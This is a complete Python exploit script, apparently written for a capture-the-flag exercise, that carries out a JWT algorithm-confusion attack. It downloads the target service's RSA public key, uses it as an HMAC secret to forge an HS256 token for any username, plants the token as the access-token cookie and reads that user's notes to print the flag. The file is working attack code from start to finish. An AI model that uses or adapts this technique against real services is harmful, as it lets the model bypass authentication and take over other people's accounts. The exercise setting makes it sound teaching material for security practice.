import requests
import sys
import random
import string
import base64
import six
import struct
from authlib.jose import jwt
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

"""

This is the exploit script for vulnerability 2 (JWT Algorithm Confusion)
This program takes 2 arguments:

- ip-address
- username (should be provided via flag id)

"""


def randomString():
    name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8))
    return name

def exploit(ip, username):
    s = requests.Session()
    webshop_base = f"http://{ip}:10100"
    jwktopem = JWKtoPEM(webshop_base + "/rsa_pub")
    public_key = jwktopem.digest()

    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": username}
    token = jwt.encode(header, payload, public_key)
    cookie = {
        "name": "access-token",
        "value": token.decode('utf-8')
    }
    s.cookies.set(**cookie)

    flag = s.get(webshop_base + "/notes").text
    print(f"FLAG IS: {flag}")

class JWKtoPEM:

    def __init__(self, url):
        self.url = url

    @classmethod
    def intarr2long(cls, arr):
        return int(''.join(["%02x" % byte for byte in arr]), 16)

    @classmethod
    def base64_to_long(cls, data):
        if isinstance(data, six.text_type):
            data = data.encode("ascii")
        _d = base64.urlsafe_b64decode(bytes(data) + b'==')
        return JWKtoPEM.intarr2long(struct.unpack('%sB' % len(_d), _d))

    def digest(self):
        r = requests.get(self.url)
        jwk = r.json()
        exponent = JWKtoPEM.base64_to_long(jwk['e'])
        modulus = JWKtoPEM.base64_to_long(jwk['n'])
        numbers = RSAPublicNumbers(exponent, modulus)
        public_key = numbers.public_key(backend=default_backend())
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return pem

if __name__ == "__main__":
    args = sys.argv[1:]
    if len(args) != 2:
        print("Usage: python exploit2.py [SERVICE-IP-ADDRESS] [USERNAME/FLAG-ID]")
        sys.exit(1)

    ip = args[0]
    username = args[1]

    exploit(ip, username)
